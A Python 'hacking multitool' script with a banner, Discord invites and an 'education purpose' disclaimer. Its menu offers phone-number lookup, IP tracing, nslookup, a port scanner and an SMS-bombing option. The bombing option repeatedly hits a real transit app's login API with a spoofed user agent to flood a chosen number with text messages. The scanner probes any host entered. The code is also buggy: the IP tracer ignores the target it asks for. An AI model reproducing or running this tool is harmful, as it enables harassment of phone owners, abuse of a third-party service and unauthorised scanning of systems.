print( """ 

  _                      ______   _______   ____  ____  ______           ______  \     /
 / |  x     \            |        |      |  |   \/   |  |  _  \  |       |        \   /
(  )        0            |        |      |  |  |\/|  |  | |_)  | |       |         \ /
 \_/-, ,----'  ____      |        |      |  |  |  |  |  |   __/  |       |____     /\         
    ====      ||   \_    |        |      |  |  |  |  |  |  |     |       |        /  \ 
   /  \-'~;   ||     |   |        |      |  |  |  |  |  |  |     |       |       /    \ 
  /  __/~| ...||__/|_|   |_____   |______|  |  |  |  |  |  |     |______ |_____ /      \   
=(  _____||________|                                  v.1.0.0
                                                 Multiple tool for h4cking

DISCLAIM : ONLY USE THIS TOOL FOR EDUCATION PURPOSE                                                 

                                                     Join our discord servers
                                                     https://discord.gg/GfYyvNS9a5
                                                     https://discord.gg/qE4nedb5C6
""")


import phonenumbers as pn  #Phone info
from phonenumbers import carrier, geocoder, timezone #Phone info
import os
import json #IP-Tracer
import sys
from urllib.request import urlopen #IP-Tracer
from tqdm import tqdm #SMS bombing
import requests #SMS bombing
import asyncio
from nslookup import Nslookup #nslookup
from socket import * #port scanning
import time #port scanning


while True:
    print('[1] Phone number info ')
    print('[2] IP-Trace')
    print('[3] Bombing')
    print('[4] Nslookup')
    print('[5] Port Scanning')
    print('[6] EXIT')
    player_choice = input()


    if player_choice =='1':
        phone = pn.parse(input('Enter phone number(ex. +30**********) : '))
        print(phone)
        print(pn.is_valid_number(phone))
        print(carrier.name_for_number(phone, 'en'))
        print(geocoder.description_for_number(phone, 'en'))
        print(timezone.time_zones_for_number(phone))
        continue
    
    elif player_choice =='2':
        ip=input ("Enter target ip :")
        url = "http://ip-api.com/json/"
        response = urlopen(url)
        data = response.read()
        values = json.loads(data)
        print("IP:" + values ['query'])
        print("City:" + values ['city'])
        print("ISP:" + values ['isp'])
        print("Country:" + values ['country'])
        print("Region:" + values ['region'])
        print("Time Zone : " + values ['timezone'])
        continue
        
    else:
        print('')


    if player_choice =='3':
        headers = ({'User-Agent':
            'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
        phoneNumber = input("Enter phone number(ex. 44**********) : ")
        phoneNumber = str(phoneNumber)
        url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
        numofmsgs = int(input("Enter number of messages to send: "))
        successspamCount = 0
        failspamCount = 0
        for i in tqdm(range(numofmsgs)):
            resp = requests.get(url)
            if resp.status_code == 200:
                successspamCount = successspamCount + 1
            else: 
                failspamCount = failspamCount + 1
                print("Total successful messages sent: ",  successspamCount)
                print("Total failed messages sent: ", failspamCount)


    if player_choice =='4':
        domain =input('Enter domain(ex. example.com) : ')
        dns_query = Nslookup(dns_servers=["1.1.1.1"])
        ips_record = dns_query.dns_lookup(domain)
        print(ips_record.response_full, ips_record.answer)
        soa_record = dns_query.soa_lookup(domain)
        print(soa_record.response_full, soa_record.answer)
        continue
    else:
        print('')



    startTime = time.time()
    if player_choice =='5':
        target = input('Enter the host to be scanned: ')
        t_IP = gethostbyname(target)
        print ('Starting scan on host: ', t_IP)
        for i in range(50, 500):
            s = socket(AF_INET, SOCK_STREAM)       
            conn = s.connect_ex((t_IP, i))
            if(conn == 0) :
                print('Port %d: OPEN' % (i,))
                s.close()
        print('Time taken:', time.time() - startTime)
        continue


    if player_choice =='6':
        async def main():
            print('Exiting...')
            await asyncio.sleep(1)
            print('More features tools are coming stay tuned')
            await asyncio.sleep(1)
            print('Byee !!')      
            sys.exit()
        asyncio.run(main())
        
